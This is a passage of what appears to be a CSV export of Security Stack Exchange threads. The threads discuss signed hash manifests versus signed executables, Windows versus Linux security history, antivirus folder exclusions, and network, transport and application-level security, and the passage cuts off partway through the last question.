<p>If my doctor sends a message saying &quot;you have a message on the portal&quot; someone who picks up my phone can't read the actual medical info.  There are times I wish they would permit us to turn down the security a bit--please include the merchant in credit card transaction e-mails!--but the idea is sound.</p>
<p>Also, in the real world the technically literate sometimes end up seeing mailboxes of their illiterate friends.  Yeah, in a perfect world they would always do their own logins, a tech would never mess with their equipment.  We don't live in a perfect world.</p>
","-1"
"262603","262603","Is it normal, that some companies just sign the txt file which contains the sha value of the program?","<p>Scenario A: Suppose I have an .exe file, the provider offers a sha1 txt file with hash value and this txt file is gpg signed. So I check if the hash value matches the exe file and then download the key either from the keyserver or directly from the provider, check the fingerprint again and see if the txt file is signed correctly.</p>
<p>Scenario B: The provider offers an .exe file and a gpg signature, I can check the exe program directly with the sig file.</p>
<p>Are both scenarios equally secure?</p>
","1","3","262604","<p>They are basically the same. On both scenarios, an attacker have to change two files to make you download a tainted executable. On scenario A, it's the executable and the text file. On scenario B, the executable and the HTML page.</p>
<p>On either case, the workflow is the same: you get the provided signed hash, the public key, and validate the signature. From the security standpoint, it does not matter if the signature is on the webpage itself or in a text file.</p>
","1"
"262603","262603","Is it normal, that some companies just sign the txt file which contains the sha value of the program?","<p>Scenario A: Suppose I have an .exe file, the provider offers a sha1 txt file with hash value and this txt file is gpg signed. So I check if the hash value matches the exe file and then download the key either from the keyserver or directly from the provider, check the fingerprint again and see if the txt file is signed correctly.</p>
<p>Scenario B: The provider offers an .exe file and a gpg signature, I can check the exe program directly with the sig file.</p>
<p>Are both scenarios equally secure?</p>
","1","3","262610","<p>You did not mention who is an adversary and their capabilities;</p>
<blockquote>
<p>Scenario A: Suppose I have an .exe file, the provider offers a sha1 txt file with hash value and this txt file is gpg signed. So I check if the hash value matches the exe file and then download the key either from the keyserver or directly from the provider, check the fingerprint again and see if the txt file is signed correctly.</p>
</blockquote>
<p><strong>If developer are Evil</strong></p>
<ol>
<li><p>If they are evil developers they will make three versions of the software;</p>
<ul>
<li><p>Good one does what as advertised, nothing malicious.</p>
</li>
<li><p>Bad one does harm, and uploads valuable information to a third-party website.</p>
</li>
<li><p>Sneaky one does do harm in a sneaky manner, silently disable your disk encryption or upload the data as a part of telemetry but encrypted.</p>
<p>The Good and Sneaky one collides under SHA-1 which is already shuttered. The bad one doesn't collide with them.</p>
</li>
</ul>
</li>
<li><p>They publish the good package under their name and do what as advertised no backdoor and no sneaky.</p>
</li>
<li><p>They hire someone from outside and hack the servers and upload the bad one into one server and the sneaky one to the others.</p>
</li>
<li><p>A good ITSEC notices the bad one and the Company published the hash of the good one ( maybe initially ) and everyone checks their system.</p>
</li>
<li><p>Some found their files are not good and this creates a storm and everybody update their software. Now, almost everybody has the sneaky one.</p>
</li>
</ol>
<p>So you need a trustful company. Otherwise, it is disastrous.</p>
<p><strong>Attackers</strong></p>
<p>Well, it is also possible that the company is hacked and the file and signature were created by the attacker. Check the news!</p>
<p>If the attacker adversary cannot access the signature key, they need to break the second pre-image attack to find another executable file that has the same hash to upload into the servers. Currently, this is not possible even with SHA-1.</p>
<blockquote>
<p>Scenario B: The provider offers an .exe file and a gpg signature, I can check the exe program directly with the sig file.</p>
</blockquote>
<p>A similar evil developer scenario applies here, too. The attacker's case is still the same.</p>
<blockquote>
<p>Are both scenarios equally secure?</p>
</blockquote>
<p>If we assume that we have semi-honest company;</p>
<p>There is a small difference in the signatures; normally before the signature, input is hashed as a part of the signature scheme. Scenario A unnecessarily hashes the file before the sign. They will have different signatures and Scenario A has some CPU/bandwidth/storage cost penalties.</p>
<p>Apart from this, they are the same!</p>
<p>Why do you still use SHA-1? Drop it, use SHA-512, SHA3-512, Blake2b, etc.</p>
","1"
"262603","262603","Is it normal, that some companies just sign the txt file which contains the sha value of the program?","<p>Scenario A: Suppose I have an .exe file, the provider offers a sha1 txt file with hash value and this txt file is gpg signed. So I check if the hash value matches the exe file and then download the key either from the keyserver or directly from the provider, check the fingerprint again and see if the txt file is signed correctly.</p>
<p>Scenario B: The provider offers an .exe file and a gpg signature, I can check the exe program directly with the sig file.</p>
<p>Are both scenarios equally secure?</p>
","1","3","262629","<p>In general, it's fine to provide a signed manifest file with hashes instead of individual signed files.  Kernel.org, along with many other projects, do this, often by signing the output of something like <code>sha256sum</code>.</p>
<p>If the key lives in a hardware security module, this can often have substantially better performance, especially when signing large files like software archives or ISOs, since typically the hardware security module has limited bandwidth and has to see all the bytes that are signed.  It can also be more performant for the end user if they must verify many files at once, because verifying the signature is more expensive than a simple hash and that operation needs to be done only once instead of multiple times.</p>
<p>In the particular case you mentioned, which uses SHA-1, this isn't secure, because SHA-1 is subject to collisions, and so a malicious distributor could distribute two versions with the same hash, one which is benign and one which is malicious.  In order for this approach to be secure, you need to use a cryptographically secure hash function, like one of the SHA-2, SHA-3, or BLAKE2 hash functions, and not something insecure like MD5 or SHA-1.</p>
","3"
"262490","262490","What prevents Windows from being as secure as Linux?","<p>According to <a href=""https://en.wikipedia.org/wiki/Linux_malware"" rel=""nofollow noreferrer"">wikipedia</a>, Linux's security compared to Windows is generally due to &quot;the malware's lack of root access.&quot;</p>
<p>Why doesn't Windows just fix this?</p>
","-1","3","262494","<p>Windows <em>did</em> fix this.</p>
<p>That claim on Wikipedia is based on an article written in 2005 (i.e, the days of Windows XP). Back then, it was pretty normal for users to run with full local admin rights (including almost all home users, and a significant number of corporate users). This was mostly down to badly written software that tried to write to folders inside <code>C:\Program Files</code> or bits of the registry that are only accessible to admins.</p>
<p>When Microsoft released Windows Vista in 2007, they introduced User Account Control (UAC), and took various other steps to try and encourage users to use with non-administrative accounts, and to only elevate their privileges (with UAC) when required. This is a large part of the reason that so much software didn't work properly on Windows Vista: it assumed that users would be running with admin rights, and that was no longer the case.</p>
","2"
"262490","262490","What prevents Windows from being as secure as Linux?","<p>According to <a href=""https://en.wikipedia.org/wiki/Linux_malware"" rel=""nofollow noreferrer"">wikipedia</a>, Linux's security compared to Windows is generally due to &quot;the malware's lack of root access.&quot;</p>
<p>Why doesn't Windows just fix this?</p>
","-1","3","262495","<p>The point is not so much that Microsoft did not solve this. The point is that Windows users are/where used to being administrator all the time on their PC. If, on a Linux distribution, you would always login as root (like Puppy Linux did) and do all your work as root, you do not have this security advantage.</p>
<p>Windows users still do not seem to be used to using normal accounts in stead of administrator. There are still a lot of questions like &quot;Why am I not ADMINISTRATOR of my own system?&quot; or articles like &quot;Why You Should NOT Be Running a Windows “Admin” Account&quot;.</p>
","1"
"262490","262490","What prevents Windows from being as secure as Linux?","<p>According to <a href=""https://en.wikipedia.org/wiki/Linux_malware"" rel=""nofollow noreferrer"">wikipedia</a>, Linux's security compared to Windows is generally due to &quot;the malware's lack of root access.&quot;</p>
<p>Why doesn't Windows just fix this?</p>
","-1","3","262500","<p>For many years, Microsoft had a very poor security model for their operating systems.  They didn't design for security, but kind of tacked it on after the fact. Windows 95 (and prior) did not have any privilege separation or memory protection between programs.  Windows XP had privilege separation and memory protection, but came with all directories world writable, although there were guides and kits that explained how to lock it down and add permissions to fix this.   Windows XP (except for bugs) could have been as secure as linux, but they chose to distribute it to install as not secure.  The Microsoft code writing style of itself also had security model problems that caused a lot of security bugs in windows.  It didn't help at all that software authors coming from DOS and Windows 95 expected the system to be wide open and any attempt at securing Windows NT/XP, etc. would break that software.</p>
<p>More recently, Microsoft has done a good job of trying to fix this.  They now have a sane security model.  The operating system comes with everything locked down.  Coding style has gotten much better and a lot of the operating system has been rewritten to fix security problems, but there is likely still a lot of unexamined legacy code that hasn't been looked at in 30 years.  Windows 10 is probably very close to contemporary linux in terms of security.  However, even today with Windows 10 and Windows 11, there is third party software that breaks when users don't have admin access.</p>
<p>Having said that, Linux has had its fair share of security holes.  The pace of new CVEs for linux has been very high in the last 2-3 years.  This is likely do to the growing popularity of linux and the huge malware and ransomware industry that is attacking both linux and windows.  In the last 5 years, linux has had its fair share of devastating security holes found in 10-20 year old unexamined code, along with serious bugs in new code.  The &quot;many eyeballs&quot; theory of open source finding bugs faster is probably well balanced against the ease of bad actors getting access to code to find bugs themselves as well as (successful and unsuccessful) attempts to inject bad code with back doors into the open source community.</p>
<p>So, 10 years ago, I would say Linux was more secure just because Microsoft had a poor internal security model.  Today, I think Windows and Linux are probably pretty even in security level.</p>
","1"
"262453","262453","Is it acceptable to exclude folders in antivirus?","<p>A technical problem has arisen, and the vendor's first suggested solution is to exclude the program's folders from our antivirus. There are multiple reasons I am hesitant to do so:</p>
<ol>
<li>Primarily: If a malicious file finds its way into those folders, either via vendor patching or unrelated actions, said file will be ignored by the antivirus whereas it may otherwise have been immediately neutralized.</li>
<li>We currently only exclude specific files by their SHA256 hash. This program set, however, contains far too many files for this to be feasible.</li>
<li>This can not be scalable. If we excluded every folder for every approved application, the threat surface would be colossal.</li>
</ol>
<p>And so forth. In this specific instance, it's something we can do for a specific set of machines to test. The situation did bring forth the general question, however I'm curious to know what the larger community thinks about <strong>when is it acceptable to exclude folders in antivirus</strong>, and <strong>why</strong>? The short answer, I would argue, is &quot;as little as possible&quot; for the reasons I listed above and more, but I came to realize that I can't think of a single scenario where it <em>would</em> be a good idea. The functionality is common in antivirus applications, which suggests that there are legitimate reasons to do so, but I can't think of an instance where we would want to leave an entire folder free to become infected.</p>
<p>I struggle to put this into precise words, but it feels like violating some analogue to the least-trust principle -- it'd be a lot smoother day-to-day to give all employees full admin access to everything, until it goes horribly wrong; similarly, it'd be really easy to just exclude folders from antivirus at the first sign of false positive, until that backfires when there really is something malicious in there.</p>
<p>Are there examples I'm not thinking of where it really is the best solution, where this would be the advisable choice? Example scenarios and research are welcome.</p>
","14","6","262454","<p>Ah yes, ye olde problem of security tools making a system unusable. My arch nemesis.</p>
<blockquote>
<p>when is it acceptable to exclude folders in antivirus, and why?</p>
</blockquote>
<p>Short answer:</p>
<p>There's an old adage on this site that <em>&quot;Security at the expense of usability comes at the expense of security&quot;</em> -- ie if your security controls make a system unusable, then people will find cheeky ways around your controls (like CTRL+ALT+DEL killing the anti-virus agent, or doing their work on a machine that does not have the AV installed), often resulting in bigger security holes than what you were trying to prevent in the first place.</p>
<p>Not to mention that an entire company's worth of lost productivity due to fighting with sec tools can add up to be as expensive as the breach they're trying to prevent. Remember that the goal of infosec is to <em>add value</em> to the company's bottom line; if you hurt productivity too much then you're actually doing tho opposite.</p>
<p>Dialing back security tools so that people can actually get their jobs done is often necessary. Examine your options, do some trials with a few volunteers, and then re-engage the tool in a less disruptive way.</p>
<hr />
<p>Longer answer:</p>
<blockquote>
<p>Primarily: If a malicious file finds its way into those folders, either via vendor patching or unrelated actions, said file will be ignored by the antivirus whereas it may otherwise have been immediately neutralized.</p>
</blockquote>
<p>And of course if it becomes known that this folder is excluded, then malicious files may <em>intentionally</em> find their way there!</p>
<blockquote>
<p>We currently only exclude specific files by their SHA256 hash. This program set, however, contains far too many files for this to be feasible.</p>
</blockquote>
<blockquote>
<p>This can not be scalable. If we excluded every folder for every approved application, the threat surface would be colossal.</p>
</blockquote>
<p>Some options to consider:</p>
<ul>
<li>If those application folders are super locked down (like read-only by local accounts, writable only by some domain super user account), and you AV those applications before deploying them, then maybe excluding the whole folders is reasonable.</li>
<li>Many AVs now support code-signing-based allow lists. So for example at the time that you approve Firefox, you could add Mozilla's code signing cert to your allow list. This approach has drawbacks because not all vendors code-sign, and just because you trust one app from a given vendor, you may not want to trust everything they produce.</li>
<li>Keep an in-house code-signing CA to sign files that you want the AV to ignore. That way the AV's allow list consists only of your in-house CA. This still has the drawback that you can only codesign binaries, so if the AV is causing problems with config and data files then this won't help.</li>
</ul>
","28"
"262453","262453","Is it acceptable to exclude folders in antivirus?","<p>A technical problem has arisen, and the vendor's first suggested solution is to exclude the program's folders from our antivirus. There are multiple reasons I am hesitant to do so:</p>
<ol>
<li>Primarily: If a malicious file finds its way into those folders, either via vendor patching or unrelated actions, said file will be ignored by the antivirus whereas it may otherwise have been immediately neutralized.</li>
<li>We currently only exclude specific files by their SHA256 hash. This program set, however, contains far too many files for this to be feasible.</li>
<li>This can not be scalable. If we excluded every folder for every approved application, the threat surface would be colossal.</li>
</ol>
<p>And so forth. In this specific instance, it's something we can do for a specific set of machines to test. The situation did bring forth the general question, however I'm curious to know what the larger community thinks about <strong>when is it acceptable to exclude folders in antivirus</strong>, and <strong>why</strong>? The short answer, I would argue, is &quot;as little as possible&quot; for the reasons I listed above and more, but I came to realize that I can't think of a single scenario where it <em>would</em> be a good idea. The functionality is common in antivirus applications, which suggests that there are legitimate reasons to do so, but I can't think of an instance where we would want to leave an entire folder free to become infected.</p>
<p>I struggle to put this into precise words, but it feels like violating some analogue to the least-trust principle -- it'd be a lot smoother day-to-day to give all employees full admin access to everything, until it goes horribly wrong; similarly, it'd be really easy to just exclude folders from antivirus at the first sign of false positive, until that backfires when there really is something malicious in there.</p>
<p>Are there examples I'm not thinking of where it really is the best solution, where this would be the advisable choice? Example scenarios and research are welcome.</p>
","14","6","262463","<p>One example I recall as a software developer is the exclusion of &quot;build&quot; folders. In these folders, the compiler creates new executables. New executables are of course suspect to virus scanners, and the build process also generates a lot of intermediate files. At the same time, quite often this disk I/O <a href=""https://xkcd.com/303/"" rel=""noreferrer"">slows down the developers </a>. Excluding these build folders will make developers a lot more productive.</p>
<p>What's the risk? Is this a good place for a virus to hide? Not exactly. These build folders are frequently cleaned out, if not removed altogether.</p>
<p>However, you should have a discussion with the developers about writing software installers. These installers should install only your own software; one of the biggest risks is that they unintentionally distribute a virus. The folders used to build the installer should absolutely be checked. But additionally the installer definition should be rather explicit. Don't include <code>*.exe</code>; your developers should know their own executables.</p>
","11"
"262453","262453","Is it acceptable to exclude folders in antivirus?","<p>A technical problem has arisen, and the vendor's first suggested solution is to exclude the program's folders from our antivirus. There are multiple reasons I am hesitant to do so:</p>
<ol>
<li>Primarily: If a malicious file finds its way into those folders, either via vendor patching or unrelated actions, said file will be ignored by the antivirus whereas it may otherwise have been immediately neutralized.</li>
<li>We currently only exclude specific files by their SHA256 hash. This program set, however, contains far too many files for this to be feasible.</li>
<li>This can not be scalable. If we excluded every folder for every approved application, the threat surface would be colossal.</li>
</ol>
<p>And so forth. In this specific instance, it's something we can do for a specific set of machines to test. The situation did bring forth the general question, however I'm curious to know what the larger community thinks about <strong>when is it acceptable to exclude folders in antivirus</strong>, and <strong>why</strong>? The short answer, I would argue, is &quot;as little as possible&quot; for the reasons I listed above and more, but I came to realize that I can't think of a single scenario where it <em>would</em> be a good idea. The functionality is common in antivirus applications, which suggests that there are legitimate reasons to do so, but I can't think of an instance where we would want to leave an entire folder free to become infected.</p>
<p>I struggle to put this into precise words, but it feels like violating some analogue to the least-trust principle -- it'd be a lot smoother day-to-day to give all employees full admin access to everything, until it goes horribly wrong; similarly, it'd be really easy to just exclude folders from antivirus at the first sign of false positive, until that backfires when there really is something malicious in there.</p>
<p>Are there examples I'm not thinking of where it really is the best solution, where this would be the advisable choice? Example scenarios and research are welcome.</p>
","14","6","262483","<p><strong>It is often necessary if performance matters.</strong></p>
<p>I work in HPC, developing software for computer simulations of chemical processes. Just like the vendor you're talking about, we would often recommend our Windows users to add the directory of our SW to the antivirus exclusion list. Why? Because it's the only reasonable response to any support question along the lines of &quot;I just noticed my calculations are twice as slow on Windows than they are on Linux on the same machine. What gives? Please kindly fix your software.&quot;</p>
<p>Just like your vendor, we distribute something that consists of tens of thousands of files of all sorts, totaling over 6 GiB in a fresh base install. When you start a calculation, the antivirus will typically decide to scan all those files, which understandably takes ages (and it also often does it synchronously, so our application just has to sit there waiting for the antivirus to finish scanning one file, then work for a few microseconds and wait for another file, ad nauseam).</p>
<p>Also, running a calculation typically produces up to tens of gigabytes of files, some of which are scratch files that get rewritten over and over. Letting the antivirus scan all that easily slows everything down by a factor of two or more.</p>
<p>So in the end, it's up to the user to decide whether they prefer getting the results in 4 hours without an antivirus or next day with one.</p>
","16"
"262453","262453","Is it acceptable to exclude folders in antivirus?","<p>A technical problem has arisen, and the vendor's first suggested solution is to exclude the program's folders from our antivirus. There are multiple reasons I am hesitant to do so:</p>
<ol>
<li>Primarily: If a malicious file finds its way into those folders, either via vendor patching or unrelated actions, said file will be ignored by the antivirus whereas it may otherwise have been immediately neutralized.</li>
<li>We currently only exclude specific files by their SHA256 hash. This program set, however, contains far too many files for this to be feasible.</li>
<li>This can not be scalable. If we excluded every folder for every approved application, the threat surface would be colossal.</li>
</ol>
<p>And so forth. In this specific instance, it's something we can do for a specific set of machines to test. The situation did bring forth the general question, however I'm curious to know what the larger community thinks about <strong>when is it acceptable to exclude folders in antivirus</strong>, and <strong>why</strong>? The short answer, I would argue, is &quot;as little as possible&quot; for the reasons I listed above and more, but I came to realize that I can't think of a single scenario where it <em>would</em> be a good idea. The functionality is common in antivirus applications, which suggests that there are legitimate reasons to do so, but I can't think of an instance where we would want to leave an entire folder free to become infected.</p>
<p>I struggle to put this into precise words, but it feels like violating some analogue to the least-trust principle -- it'd be a lot smoother day-to-day to give all employees full admin access to everything, until it goes horribly wrong; similarly, it'd be really easy to just exclude folders from antivirus at the first sign of false positive, until that backfires when there really is something malicious in there.</p>
<p>Are there examples I'm not thinking of where it really is the best solution, where this would be the advisable choice? Example scenarios and research are welcome.</p>
","14","6","262484","<p>I've encountered a number of cases where excluding a folder was the right (or sometimes <em>only</em>) option.  It shouldn't be your default solution to problems, but it does have legit use cases.</p>
<p>One of the most common cases is for directories that are used for short-lived temporary files.  For instance, I have a system that runs an FTP server that handles large files.  When a file gets written to the server, data gets incrementally saved to a specific working folder as is it transferred.  After the transfer finishes, the chunks get assembled into the completed file and written to its intended location.  Scanning the files in the staging folder is largely pointless because they aren't complete files (thus more likely something gets misinterpreted), plus they'll get scanned once they get saved to the destination directory.  The directory permissions were locked down so that only the FTP server process could write to it, so the security risk was minimal and the performance improvements were very noticeable.  Ignoring the directory is better than whitelisting the program because you <em>do</em> want the files scanned when the server writes them to their final destination.</p>
<p>Another case is directories that aren't really directories.  If you create a symbolic link to a directory, that directory's contents will show up in two places.  There's no need to scan the files twice, so you can ignore the linked directory.  Most AV clients have an option to blanket ignore <em>all</em> symbolic links, but disabling this feature globally isn't always appropriate.  Similarly, it's often desirable to ignore mounted folders (network drive that's mapped to a directory instead of a drive letter).  If you know that directory points to a trusted internal server that has its own security software running, there's no need to scan it twice.  In some cases, the local and remote virus scanners can step on each other's toes and cause problems if they both try to scan the directory at the same time.  At a minimum, scanning a file across a network will be extremely slow.</p>
<p>And of course, don't forget that security software is not perfect.  False positives will exist.  The creator of a program that triggered a false positive can't always resolve the issue because they have no insight into how the AV is making decisions.  Ignoring the directory for a trusted program is sometimes the <em>only</em> way to be able to use that program at all.  This tends to be particularly true for rare, niche programs that AV vendors wouldn't reasonably have access to for testing.  In cases like this, thoroughly vet the program and vendor manually.</p>
<p>The general thread running through these is that every directory doesn't need a virus scanner.  Every directory needs <em>protection</em>, and an antivirus is just one of many tools that can provide that protection.  Use whichever tool is the simplest and least disruptive for the case at hand.</p>
","7"
"262453","262453","Is it acceptable to exclude folders in antivirus?","<p>A technical problem has arisen, and the vendor's first suggested solution is to exclude the program's folders from our antivirus. There are multiple reasons I am hesitant to do so:</p>
<ol>
<li>Primarily: If a malicious file finds its way into those folders, either via vendor patching or unrelated actions, said file will be ignored by the antivirus whereas it may otherwise have been immediately neutralized.</li>
<li>We currently only exclude specific files by their SHA256 hash. This program set, however, contains far too many files for this to be feasible.</li>
<li>This can not be scalable. If we excluded every folder for every approved application, the threat surface would be colossal.</li>
</ol>
<p>And so forth. In this specific instance, it's something we can do for a specific set of machines to test. The situation did bring forth the general question, however I'm curious to know what the larger community thinks about <strong>when is it acceptable to exclude folders in antivirus</strong>, and <strong>why</strong>? The short answer, I would argue, is &quot;as little as possible&quot; for the reasons I listed above and more, but I came to realize that I can't think of a single scenario where it <em>would</em> be a good idea. The functionality is common in antivirus applications, which suggests that there are legitimate reasons to do so, but I can't think of an instance where we would want to leave an entire folder free to become infected.</p>
<p>I struggle to put this into precise words, but it feels like violating some analogue to the least-trust principle -- it'd be a lot smoother day-to-day to give all employees full admin access to everything, until it goes horribly wrong; similarly, it'd be really easy to just exclude folders from antivirus at the first sign of false positive, until that backfires when there really is something malicious in there.</p>
<p>Are there examples I'm not thinking of where it really is the best solution, where this would be the advisable choice? Example scenarios and research are welcome.</p>
","14","6","262488","<p>Just a few thoughts.</p>
<p>With exclusions, you really need to be clear as to why you are making an exclusion and is it the correct type for the security solution installed. Exclusions in one security product can mean something totally different in another.</p>
<p>Scenario for an issue:</p>
<p>C:\app1\Process1.exe repeatedly writes to C:\p1\temp\filex.dat.</p>
<p>The issues here could be:</p>
<ol>
<li>Performance, as C:\p1\temp\filex.dat is repeatedly written to and potentially changing, then depending on the security product, as the file is closed/opened, this could result in a scan of the file. A hash exclusion here is of a little use.</li>
<li>In the past, the vendor of the application has seen corruption or deletion of C:\p1\temp\filex.dat by either a false positive and they are therefore &quot;protecting&quot; their product and their support department to some extent from potential future issues by creating a generic knowledgebase article, without any real regard for security.</li>
</ol>
<p>The options:</p>
<p>Assuming the performance issue is bad enough to take action and the security vendor agrees there is not much that can be done within the product given the behaviour, the best option here is likely a full path exclusion for real-time scanning C:\p1\temp\filex.dat.
You could still scan this file as part of a scheduled/on-demand scan but then issue 2 could be a problem. The nature of the file excluded is of interest here.</p>
<p>Some vendors might lazily advise through an article for the above scenario:
<em>Exclude C:\app1\Process1.exe from scanning.</em></p>
<p>What does that actually mean for the security product you have?</p>
<ul>
<li>Don't scan the file C:\app1\Process1.exe? This wouldn't help.</li>
<li>Don't track the behaviour of the process C:\app1\Process1.exe. It would be insecure to allow a process to run unchecked. What if a malicious module was loaded into the process? What about a supply chain attack where the product updated the file C:\app1\Process1.exe with one that has malicious functionality?</li>
<li>Don't scan the files &quot;touched&quot; by C:\app1\Process1.exe - As above, you don't need to exclude all files the process touches in this scenario.</li>
<li>Don't inject any modules into it? Security products tend to rely on drivers to inject modules into processes as they start. Will this still happen with this exclusion? What functionality of the solution does that break?</li>
<li>What about hashing it for EDR/XDR purposes? It is quite likely scanning and EDR is handled by different parts of the solution such that exclusions could be handled differently. Is this what you want?</li>
<li>What about if the process loads the AMSI.dll and pulls in the security vendors AMSI provider? Is this OK?</li>
</ul>
<p>It maybe the security product being used doesn't even scan .dat files, so the file type can be significant. How do you know it's even being scanned by security vendor A? Process Monitor, log files of the security product? What size is the file, how complex is the file to scan?</p>
<p>The point being, you have to know both why you are making or being recommended to make an exclusion and what is the appropriate exclusion(s) in the security product you are running as they all implement exclusions differently. The second is very hard not least due to security products being under constant development.</p>
","0"
"262453","262453","Is it acceptable to exclude folders in antivirus?","<p>A technical problem has arisen, and the vendor's first suggested solution is to exclude the program's folders from our antivirus. There are multiple reasons I am hesitant to do so:</p>
<ol>
<li>Primarily: If a malicious file finds its way into those folders, either via vendor patching or unrelated actions, said file will be ignored by the antivirus whereas it may otherwise have been immediately neutralized.</li>
<li>We currently only exclude specific files by their SHA256 hash. This program set, however, contains far too many files for this to be feasible.</li>
<li>This can not be scalable. If we excluded every folder for every approved application, the threat surface would be colossal.</li>
</ol>
<p>And so forth. In this specific instance, it's something we can do for a specific set of machines to test. The situation did bring forth the general question, however I'm curious to know what the larger community thinks about <strong>when is it acceptable to exclude folders in antivirus</strong>, and <strong>why</strong>? The short answer, I would argue, is &quot;as little as possible&quot; for the reasons I listed above and more, but I came to realize that I can't think of a single scenario where it <em>would</em> be a good idea. The functionality is common in antivirus applications, which suggests that there are legitimate reasons to do so, but I can't think of an instance where we would want to leave an entire folder free to become infected.</p>
<p>I struggle to put this into precise words, but it feels like violating some analogue to the least-trust principle -- it'd be a lot smoother day-to-day to give all employees full admin access to everything, until it goes horribly wrong; similarly, it'd be really easy to just exclude folders from antivirus at the first sign of false positive, until that backfires when there really is something malicious in there.</p>
<p>Are there examples I'm not thinking of where it really is the best solution, where this would be the advisable choice? Example scenarios and research are welcome.</p>
","14","6","262513","<p>From a software developers perspective there are a lot of good reasons to disable intrusive AV solutions. You should always look for the threats you actually try to prevent. For user machines the solution might be entirely different than for hardend server machines running just a single specialized application.</p>
<p>So yes, there are absolutely cases when excluding a folder is the only viable and valid solution short of uninstalling the AV solution or the application.</p>
<p>Performance is the first big issue. AV solutions increase the latency for all calls intercepted, be it filesystem, network, syscalls or others. If the product in use is sensitive to latency the AV system may turn it from useful to useless easily. Some people try to run a full fledged Oracle database with AV scanning on the redo log and data files. That fails in astonishing ways and can easily waste huge amounts of company money.</p>
<p>Reliability is another big issue. AV solutions make certain file operations fail hard and require the application to handle it, e.g. any file access needs to do a few retries for trivial stuff. That is especially troublesome for cross platform software that also runs on Unix/Linux where such troubles are basically non-existant. So if the application tries to delete a folder and recreate it right away: AV has a race with the app and breaks it. Or the application tries to write a file and rename it right away, common pattern for atomic write. AV has a race with the app and breaks it. So the app needs to be coded as if running in a hostile environment.</p>
<p>AV solutions that inject random code into applications to hook APIs are also a great joy to work with. First it might trigger any anti-debug or integrity check features of the app, and break. Then it might wreak havok with a nice memory layout by placing its code right in the middle of the address space. Or it might even make any crash dumps unusable by breaking the global crash dump handlers, because the AV vendor considers his crash dumps to be more valuable than app crash dumps.</p>
","1"
"262451","262451","Confused with the difference between approaches to network level, transport level and application level security","<p>I'm reading from Cryptography and Network Security: Principles and Practice
by William Stallings and I can't quite get the difference between transport and network level security by reading the text.</p>
<p>In particular, after mentioning the transport level approach it doesn't say anything about why it would be used rather than the network level approach. Why isn't the network level approach enough in the first place?</p>
<p>It gets more confusing when it mentions &quot;TLS can be embedded in specific packages (e.g. web browsers) because this makes it more of &quot;application-level&quot; approach.
<a href=""https://i.stack.imgur.com/eIO6x.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/eIO6x.png"" alt=""enter image description here"" /></a></p>
","2","3","262464","<blockquote>
<p>difference between transport and network level security by reading the
text.</p>
</blockquote>
<p>There is very little difference and these discussions require context to have practical discussions.</p>
<p>Network level security is implemented by network devices. Think firewalls, access gateways, network segmentation. Remember that these devices may and today often do have abilities which can interact at levels above the Network Level.</p>
<p>The <a href=""https://en.wikipedia.org/wiki/Internet_protocol_suite#Transport_layer"" rel=""nofollow noreferrer"">Transport Layer</a> (Within TCP/IP) establishes host-to-host connectivity in the form of end-to-end message transfer services that are independent of the underlying network layer and independent application layer. Seldom is security implemented at this level.</p>
<p><a href=""https://en.wikipedia.org/wiki/Transport_Layer_Security"" rel=""nofollow noreferrer"">Transport Layer Security (TLS/SSL)</a> which runs in the <strong>application layer</strong> of the <a href=""https://en.wikipedia.org/wiki/Internet_protocol_suite"" rel=""nofollow noreferrer"">Internet protocol suite (TCP/IP)</a> used to transport that data over the network.</p>
<p>Application Level security is implemented within an application which encrypts the data which is sent to the transport Layer Protocol which goes over the network through the various devices.</p>
<p>No one should assume that any one level of security is &quot;better&quot; than another and typically more than one is implemented.</p>
<p>The OSI Model has a <a href=""https://en.wikipedia.org/wiki/Presentation_layer"" rel=""nofollow noreferrer"">Presentation layer</a> which is typical for where Encryption and Decryption are typically performed.</p>
<p>Almost always in security failures are improper implementation than on protocol errors.</p>
","2"
"262451","262451","Confused with the difference between approaches to network level, transport level and application level security","<p>I'm reading from Cryptography and Network Security: Principles and Practice
by William Stallings and I can't quite get the difference between transport and network level security by reading the text.</p>
<p>In particular, after mentioning the transport level approach it doesn't say anything about why it would be used rather than the network level approach. Why isn't the network level approach enough in the first place?</p>
<p>It gets more confusing when it mentions &quot;TLS can be embedded in specific packages (e.g. web browsers) because this makes it more of &quot;application-level&quot; approach.
<a href=""https://i.stack.imgur.com/eIO6x.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/eIO6x.png"" alt=""enter image description here"" /></a></p>
","2","3","262475","<p>The pictures drawn are a bit misleading (that is to say, I think b and c are wrong).</p>
<p>The first is the network level security. If you implement network-level security between network A and network B, all traffic between those two networks wil use that security. If an IPSec tunnel is created, whether it is http, https, telnet or ssh, all the traffic will go through that IPSec tunnel. The outside world (outside the tunnel) wil not see the kind of traffic that goes over your tunnel, so no-one can see that you're still using telnet, for example.  (in stead of whole networks, you can also use a single host)</p>
<p>TLS is a bit higher in the network stack. That means that more parts of the packets over the network are visible. For example: if you're using your browser to access a tls-secured site, the outside world will see that you are accessing port 443 (if all things are default). In practice nowadays, there is not a single TLS layer for all applications above it. Virtually all applications that use TLS have their own layer implemented in the application. So, imho, b should be</p>
<pre><code>+------+------+-----+
| HTTP |  FTP | SMTP|
+------+------+-----+
|  TLS |  TLS | TLS |
+------+------+-----+
|       TCP         |
+-------------------+
|       IP          |
+-------------------+
</code></pre>
<p>Application level encryption is then again more specific per application. S/MIME for mail is a good example, Kerberos is not.</p>
<p>So, why is the network-level not sufficient at the first place? The reason is, that it establishes trust between networks. Whole networks. And you may just be interested in a single host. Also, seting-up an IPSec tunnel is much more difficult than setting-up a TLS session with your browser.  So, scope and complexity make network-level security not sufficient for everything.</p>
<p>So would TLS be sufficient for everything? Well, no. For example, I use an openVPN (=networklevel security) from my mobile devices to my home network. In this way, I do not have to expose all my internal hosts for TLS access to the Internet.  On the other hand, it does replace a lot of application-level encryption. For example, real application level encryption on the WWW is virtually absent, because all browsers and webservers use TLS instead.</p>
<p>Real application level encryption is a bit a niche market. S/MIME for mail is supported by many mail-readers, but trying to mail with S/MIME from an MFP or IOT device is not always supported. You would typically use S/MIME if you do not trust your mail provider.</p>
<p>So, complexity, scope and support are also points to consider when implementing.</p>
","1"
"262451","262451","Confused with the difference between approaches to network level, transport level and application level security","<p>I'm reading from Cryptography and Network Security: Principles and Practice
by William Stallings and I can't quite get the difference between transport and network level security by reading the text.</p>
<p>In particular, after mentioning the transport level approach it doesn't say anything about why it would be used rather than the network level approach. Why isn't the network level approach enough in the first place?</p>
